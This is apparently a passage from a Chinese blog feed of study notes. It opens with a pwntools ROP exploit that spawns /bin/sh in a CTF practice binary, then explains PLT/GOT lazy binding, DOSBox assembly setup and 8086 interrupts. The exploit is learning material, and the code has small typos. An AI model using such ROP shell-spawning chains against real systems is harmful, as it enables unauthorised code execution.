class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">pop_eax_ret=<span class="number">0x80bb196</span></span><br><span class="line">pop_other_ret=<span class="number">0x806eb90</span></span><br><span class="line">int_addr=<span class="number">0x8049421</span></span><br><span class="line">bin_addr=<span class="number">0x80be408</span></span><br><span class="line">paylaod=flat([<span class="string">'a'</span>*<span class="number">112</span>,pop_eax_ret,<span class="number">0xb</span>,pop_other_ret,<span class="number">0</span>,<span class="number">0</span>,bin_addr,int_addr])</span><br><span class="line"><span class="comment">#flat模块能将patten字符串和地址结合并且转换为字节模式</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>栈的布局就是：</p><table><thead><tr><th align="center">Low Address</th></tr></thead><tbody><tr><td align="center">“A”*112</td></tr><tr><td align="center">pop_eax_ret</td></tr><tr><td align="center">0xb</td></tr><tr><td align="center">pop_edx_ecx_ebx_ret</td></tr><tr><td align="center">0</td></tr><tr><td align="center">0</td></tr><tr><td align="center">/bin/sh</td></tr><tr><td align="center">int 0x80</td></tr><tr><td align="center"><strong>High Address</strong></td></tr></tbody></table><h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><h3 id="PLT-amp-GOT"><a href="#PLT-amp-GOT" class="headerlink" title="PLT&amp;GOT"></a>PLT&amp;GOT</h3><p>以printf函数为例，运行时进行重定位是无法修改代码段的，只能将printf重定位到数据段，但是已经编译好的程序，调用printf的时候怎么才能找到这个地址呢。链接器会额外生成一小段代码，通过这段代码来获取printf()的地址，就像下面那样，进行链接的时候只需要对printf_stub()经行重定位操作就可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">;调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line">printf_stub:</span><br><span class="line">mov rax,[printf函数的存储地址];获取printf重定位之后的地址</span><br><span class="line">jmp rax;跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的存储地址，这里存储printf重定位后的地址</span><br></pre></td></tr></table></figure><p>总体来说，动态链接每个函数需要两个东西：</p><ul><li>用来存放外部函数地址的数据段</li><li>用来获取数据段记录的外部函数地址的代码</li></ul><p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（GOT，Global Offset Table），那个存放额外代码的表成为程序链接表（PLT，Procedure Link Table）</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/QQ%E5%9B%BE%E7%89%8720200214210409.png" alt></p><p>可执行文件里面保存的是PLT表的地址，对应PTL地址指向的是GOT的地址，GOT表指向的就是glibc中的地址。那我们可以发现，在这里面想要通过PLT表获取函数的地址，首先要保证GOT表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，Linux引入了延迟绑定机制</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>只有在动态库函数在被调用时，才会地址解析和重定位工作，为此可以用类似这样的代码来实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一开始没有重定位的时候将printf@got填成lookup_printf的地址</span></span><br><span class="line"><span class="keyword">void</span> <span class="built_in">printf</span>@got()</span><br><span class="line">&#123;</span><br><span class="line">    address_good:</span><br><span class="line">    jmp *<span class="built_in">printf</span>@got</span><br><span class="line">    lookup_printf:</span><br><span class="line">    <span class="comment">//调用重定位函数查找printf地址，并写到printf@got</span></span><br><span class="line">    <span class="keyword">goto</span> address_good;<span class="comment">//再返回去执行address_good</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明一下这段代码工作流程，一开始<code>printf@got</code>是<code>lookup_printf</code>函数的地址，这个函数用来寻找<code>printf()</code>的地址，然后写入<code>printf@got</code>，<code>lookup_printf</code>执行完成后会返回到<code>address_good</code>，这样再jmp的话就可以直接跳到<code>printf</code>来执行了</p><p>也就是说，如果不知道printf的地址，就去找一下，知道的话就直接去jmp执行printf了</p><p>接下来，我们就来看一下这个”找”的工作是怎么实现的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line"> 80482d0:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> 80482d6:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 80482dc:00 00                add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">080482e0 &lt;puts@plt&gt;:</span><br><span class="line"> 80482e0:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> 80482e6:68 00 00 00 00       push   $0x0</span><br><span class="line"> 80482eb:e9 e0 ff ff ff       jmp    80482d0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">080482f0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80482f0:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 80482f6:68 08 00 00 00       push   $0x8</span><br><span class="line"> 80482fb:e9 d0 ff ff ff       jmp    80482d0 &lt;_init+0x28&gt;</span><br></pre></td></tr></table></figure><p>ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common</p><p>其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0</p><p>还记得之前我们说的，在还没有执行过函数之前<code>printf@got</code>的内容是<code>lookup_printf</code>函数的地址，这就是要去找<code>printf</code>函数的地址了</p><p>现在要做的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   $0x0    ;将数据压到栈上，作为将要执行的函数的参数</span><br><span class="line">jmp    0x80482d0   ;去到了第一个表项</span><br></pre></td></tr></table></figure><p>接下来继续</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line">pushl  0x804a004  ;将数据压到栈上，作为后面函数的参数</span><br><span class="line">jmp    *0x804a008 ;跳转到函数</span><br><span class="line">add    %al,(%eax)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc.png" alt="image.png"></p><p>当执行后他有了值</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf.png" alt="image.png"></p><p>这个值对应的函数是 <code>_dl_runtime_resolve</code></p><p>那现在做一个小总结：</p><p>在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve</span><br></pre></td></tr></table></figure><p>到这里我们还需要知道</p><ol><li><code>_dl_runtime_resolve</code> 是怎么知道要查找 printf 函数的</li><li><code>_dl_runtime_resolve</code> 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项</li></ol><p>第一个问题，在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的<strong>id</strong>，告诉了<code>_dl_runtime_resolve</code>要去找哪一个函数的地址</p><p>在 elf 文件中 .rel.plt 保存了重定位表的信息，使用 <code>readelf -r test</code> 命令可以查看 test 可执行文件中的重定位信息</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780626820-92e99da4-b8f0-43c7-b9df-1ba09342a0ff.png" alt="image.png"></p><p>这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来</p><p>第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址</p><blockquote><p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p><p><strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong> </p><p><strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong> </p><p><strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p><p>动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p></blockquote><p><strong>跟着大佬的流程图来走一遍：</strong></p><p>第一次调用</p><p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg" alt="img"></p><p>之后再次调用<img src="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Win10-64bit下80x86汇编环境速成</title>
      <link href="/2020/02/12/Win10-64bit%E2%95%A7%E2%94%AC80x86%E2%95%97%CF%80%E2%96%92%CE%B1%E2%95%97%E2%95%96%E2%95%9B%E2%94%82%E2%95%A6%E2%94%98%E2%94%82%E2%95%94/"/>
      <url>/2020/02/12/Win10-64bit%E2%95%A7%E2%94%AC80x86%E2%95%97%CF%80%E2%96%92%CE%B1%E2%95%97%E2%95%96%E2%95%9B%E2%94%82%E2%95%A6%E2%94%98%E2%94%82%E2%95%94/</url>
      
        <content type="html"><![CDATA[<p>众所周知Windows只有较为古老的32位系统才提供对16位系统的兼容，现在普遍安装的64位操作系统需要一个开源的模拟环境DOSBOX来进行16位DOS环境的汇编学习操作</p><h2 id="工具包准备"><a href="#工具包准备" class="headerlink" title="工具包准备"></a>工具包准备</h2><p>这里提供一个封装好所有必备工具的DOSBOX：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1vuyNo9Benp9mXCIp5WM7Zg </span><br><span class="line">提取码：o8jg</span><br></pre></td></tr></table></figure><p>第一次双击该图标运行，就可以发现桌面生成了DOSBOX的快捷方式，点击运行即可进入</p><p>如果使用原版DOSBOX需要自行安装Link、MASM、DEBUG等程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1S6bVvZA7dtISyoTTCyAawA </span><br><span class="line">提取码：vke6</span><br></pre></td></tr></table></figure><h2 id="目录挂载"><a href="#目录挂载" class="headerlink" title="目录挂载"></a>目录挂载</h2><h3 id="原版DOSBOX"><a href="#原版DOSBOX" class="headerlink" title="原版DOSBOX"></a>原版DOSBOX</h3><p>在你的硬盘上规划一小块地方，专门作为dosbox的工作目录，比如，我的目录是D:/masm，然后你需要挂载工作目录并让dosbox每次启动时都挂载它，进入dosbox的安装目录，找到DOSBox 0.74 Options.bat文件，双击打开它，然后会看到一个txt文件，在文件末尾加入以下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount d d:masm  //标示将你硬盘的e:masm目录作为DOS系统的D盘，挂载到DOS系统上</span><br><span class="line">d:            //表示切换到dos系统的D盘，实际上就是切换到你硬盘的 e:masm目录，就是你的工作目录</span><br></pre></td></tr></table></figure><h3 id="封装版DOSBOX"><a href="#封装版DOSBOX" class="headerlink" title="封装版DOSBOX"></a>封装版DOSBOX</h3><p>每次运行DOSBOX我们都需要手动经行挂载，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:/&gt;mount e d:masm</span><br><span class="line">Drive E is mounted as local directory d:masm\</span><br><span class="line">C:/&gt;E:</span><br><span class="line">E:/&gt;</span><br></pre></td></tr></table></figure><p>就可进入我们的工作目录</p><h2 id="编译-链接-运行"><a href="#编译-链接-运行" class="headerlink" title="编译-链接-运行"></a>编译-链接-运行</h2><p>我们以一个名称为<code>2^3.asm</code>的源代码为样本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line">start:mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>首先运行masm生成obj文件，在DOS系统中可以用Tab键自动补齐</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\CODE&gt;masm 2^3.ASM</span><br></pre></td></tr></table></figure><p>然后一路回车就完事了，然后运行link经行程序链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\CODE&gt;link 2^3.OBJ</span><br></pre></td></tr></table></figure><p>就已经生成了EXE可执行文件，然后用debug调试运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\CODE&gt;debug 2^3.EXE</span><br></pre></td></tr></table></figure><p>使用t即可开始单步调试运行</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编笔记06</title>
      <link href="/2020/02/10/8086%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F06/"/>
      <url>/2020/02/10/8086%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F06/</url>
      
        <content type="html"><![CDATA[<h2 id="int指令"><a href="#int指令" class="headerlink" title="int指令"></a>int指令</h2><p>int中断是一种重要的内中断，它的功能是引发中断过程。可以在程序中使用int指令调用任何一个中断的中断处理程序。可见int指令的最终功能和call指令相似，都是调用一段程序</p><p>因此一般情况下，系统将一些具有一定功能的子程序，以中断处理程序的方式提供给应用程序调用</p><p>我们在编程的时候，可以用int指令调用这些子程序。当然，也可以自己编写一些中断处理程序供别人使用。可以将中断处理程序简称为中断例程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int n ;n为中断类型码</span><br></pre></td></tr></table></figure><p>执行过程如下：</p><ul><li>取中断类型码n</li><li>标志寄存器入栈，IF=0，TF=0</li><li>CS、IP入栈</li><li>(IP)=(n<em>4)，(CS)=(n\</em>4+2)</li><li>从此转去执行n号中断的中断处理程序</li></ul><h4 id="例子一："><a href="#例子一：" class="headerlink" title="例子一："></a>例子一：</h4><p>安装程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">;编程：安装中断7ch的中断例程</span><br><span class="line">;功能：求一个word型数据的平方</span><br><span class="line">;参数：（ax）= 要计算的数据</span><br><span class="line">;返回值：dx、ax中存放结果的高16位和低16位</span><br><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">        mov ax,cs </span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,offset sqr   ;设置ds:si指向源地址</span><br><span class="line">        mov ax,0</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov di,200h         ;设置es:di指向目的地址</span><br><span class="line">        mov cx,offset sqrend - offset sqr   ;设置cx为传输长度</span><br><span class="line">        cld                 ;设置传输方向为正</span><br><span class="line">        rep movsb</span><br><span class="line"></span><br><span class="line">        mov ax,0</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov word ptr es:[7ch*4],200h</span><br><span class="line">        mov word ptr es:[7ch*4+2],0</span><br><span class="line"></span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">sqr:</span><br><span class="line">        mul ax</span><br><span class="line">        inret ;pop IP pop CS popf</span><br><span class="line">sqrend:</span><br><span class="line">        nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line">;编程实现求平方功能的程序</span><br><span class="line">;安装程序，我们将其安装在0:200处</span><br><span class="line">;设置中断向量表，将程序的入口地址保存在7ch表项中，使其成为中断7ch的中断例程</span><br></pre></td></tr></table></figure><p>调用测试程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">        mov ax,3456</span><br><span class="line">        int 7ch         ;调用中断7ch的中断例程，计算ax中的数据的平方</span><br><span class="line">        add ax,ax</span><br><span class="line">        adc dx,dx       ;存放结果，将结果乘以2</span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h4 id="例子二："><a href="#例子二：" class="headerlink" title="例子二："></a>例子二：</h4><p>安装程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">        mov ax,cs</span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,offset capital</span><br><span class="line">        mov ax,0</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov di,200h</span><br><span class="line">        mov cx,offset capitalend - offset capital</span><br><span class="line">        cld</span><br><span class="line">        rep movsb</span><br><span class="line"></span><br><span class="line">        mov ax,0</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov word ptr es:[7ch*4],200h</span><br><span class="line">        mov word ptr es:[7ch*4+2],0</span><br><span class="line"></span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">capital:</span><br><span class="line">        push cx</span><br><span class="line">        push si</span><br><span class="line">change:</span><br><span class="line">        mov cl,[si]</span><br><span class="line">        mov ch,0</span><br><span class="line">        jcxz ok</span><br><span class="line">        and byte ptr [si],11011111b</span><br><span class="line">        inc si</span><br><span class="line">        jmp short change</span><br><span class="line">ok:</span><br><span class="line">        pop si</span><br><span class="line">        pop cx</span><br><span class="line">        iret </span><br><span class="line">capitalend:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>测试程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">data segment</span><br><span class="line">    db &apos;conversation&apos;,0</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">        mov ax,data </span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,0</span><br><span class="line">        int 7ch  </span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>这里主要是在中断例程capital中用到了寄存器si和cx，编写中断例程和编写子程序的时候具有同样的问题，就是要避免寄存器的冲突</p><p>总而言之就是要注意用到的寄存器的值的保存和恢复</p><h2 id="使用bp代替sp"><a href="#使用bp代替sp" class="headerlink" title="使用bp代替sp"></a>使用bp代替sp</h2><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lp:</span><br><span class="line">push bp</span><br><span class="line">mov bp,sp</span><br><span class="line">dec cx</span><br><span class="line">jcxz lpret</span><br><span class="line">add [bp+2],bx</span><br><span class="line">lpret:</span><br><span class="line">pop bp</span><br><span class="line">iret</span><br></pre></td></tr></table></figure><p>用bp寄存器保存调用前栈的sp，用bp代替sp，保证栈不容易被破坏，在结束函数调用后，弹出bp恢复sp</p><h2 id="BIOS和DOS中断例程的安装过程"><a href="#BIOS和DOS中断例程的安装过程" class="headerlink" title="BIOS和DOS中断例程的安装过程"></a>BIOS和DOS中断例程的安装过程</h2><p>之前我们都是自己编写中断例程，将它们放在安装程序中，然后通过运行安装程序，将他们安装到指定的内存区中，此后，别的应用程序才可以调用，那BIOS和DOS提供的中断例程是如何安装到内存中的呢？</p><ul><li>开机后，CPU一加电，初始化(CS)=0FFFFH，(IP)=0，自动从FFFF:0单元开始执行程序。在FFFF:0处有一条跳转指令，CPU执行该指令后，转去执行BIOS中的硬件系统检测和初始化程序</li><li>初始化程序将建立BIOS所支持的中断向量，即将BIOS提供的中断例程的入口地址登记在中断向量表中</li><li>硬件系统检测和初始化完成后，调用int 19h经行操作系统的引导，从此将计算机交由操作系统控制</li><li>DOS启动后，除完成其他工作外，还将它所提供的中断例程装入内存，并建立相应的中断向量</li></ul><h2 id="BIOS中断例程应用"><a href="#BIOS中断例程应用" class="headerlink" title="BIOS中断例程应用"></a>BIOS中断例程应用</h2><p>一般来说，一个供程序员调用的中断例程中往往包括多个子程序，中断例程内部用传递进来的参数来决定执行哪个子程序。BIOS和DOS提供的中断例程，都用ah来传递内部子程序的编号</p><p>例如int 10h中断例程是BIOS提供的中断例程，其中包含了多个和屏幕输出相关的子程序</p><h4 id="设置光标位置"><a href="#设置光标位置" class="headerlink" title="设置光标位置"></a>设置光标位置</h4><p>利用int 10h中断例程设置光标的位置功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ah,2;表示调用第10h号中断例程的2号子程序</span><br><span class="line">mov bh,0;设置光标到第0页</span><br><span class="line">mov dh,5;第5行</span><br><span class="line">mov dl,12;第12列</span><br><span class="line">int 10h</span><br></pre></td></tr></table></figure><p>(ah)=2表示调用第10h号中断例程的2号子程序，功能为设置光标位置，可以提供光标所在的行号（80*25字符模式下：0<del>24）、列号（80*25字符模式下：0</del>79），和页号作为参数</p><ul><li>bh中页号的含义：在内存地址空间中，B8000h~BFFFFh共32K的空间，为80*25彩色字符模式的显示缓冲区</li><li>一屏的内容在现实缓冲区中共占4000个字节</li><li>也就是说，通常情况下，B8000h~BFF9Fh中的4000个字节的内容将出现在显示器上</li></ul><h4 id="显示字符"><a href="#显示字符" class="headerlink" title="显示字符"></a>显示字符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ah,9;放置光标</span><br><span class="line">mov al,&apos;a&apos;;字符</span><br><span class="line">mov bl,7;颜色属性</span><br><span class="line">mov bh,0;第0页</span><br><span class="line">mov cx,3;字符重复个数</span><br><span class="line">int 10h</span><br></pre></td></tr></table></figure><p>bl中的颜色属性格式如下：</p><table><thead><tr><th align="center">7</th><th align="center">6</th><th align="center">5</th><th align="center">4</th><th align="center">3</th><th align="center">2</th><th align="center">1</th><th align="center">0</th></tr></thead><tbody><tr><td align="center">BL</td><td align="center">R</td><td align="center">G</td><td align="center">B</td><td align="center">I</td><td align="center">R</td><td align="center">G</td><td align="center">B</td></tr><tr><td align="center">闪烁</td><td align="center">背景</td><td align="center">背景</td><td align="center">背景</td><td align="center">高亮</td><td align="center">前景</td><td align="center">前景</td><td align="center">前景</td></tr></tbody></table><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">;在屏幕的5行12列显示3个红底高亮闪烁绿色的&apos;a&apos;</span><br><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">strat:</span><br><span class="line">        mov ah,2;表示调用第10h号中断例程的2号子程序</span><br><span class="line">        mov bh,0;设置页</span><br><span class="line">        mov dh,5;ah中放行号</span><br><span class="line">        mov dl,12;dl中放列号</span><br><span class="line">        int 10h</span><br><span class="line"></span><br><span class="line">        mov ah,9;放置光标</span><br><span class="line">        mov al,&apos;a&apos;;字符</span><br><span class="line">        mov bl,11001010b;颜色属性</span><br><span class="line">        mov bh,0;第0页</span><br><span class="line">        mov cx,3;字符重复个数</span><br><span class="line">        int 10h</span><br><span class="line"></span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="DOS中断例程应用"><a href="#DOS中断例程应用" class="headerlink" title="DOS中断例程应用"></a>DOS中断例程应用</h2><p>int 21h中断例程是DOS提供的中断例程，其中包括了DOS提供给程序员在编程时调用的子程序</p><h4 id="程序返回"><a href="#程序返回" class="headerlink" title="程序返回"></a>程序返回</h4><p>我们从前一直使用的是int 21中断例程的4ch号功能，即程序返回功能，可以提供返回值作为参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ah,4ch</span><br><span class="line">mov al,0</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure><p>我们一般合并写成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure><h4 id="光标位置显示字符串"><a href="#光标位置显示字符串" class="headerlink" title="光标位置显示字符串"></a>光标位置显示字符串</h4><p>(ah)=9表示调用第21h号中断例程的9号子程序，功能为在光标位置显示字符串，可以提供要显示字符串的地址作为参数</p><figure class="highlight 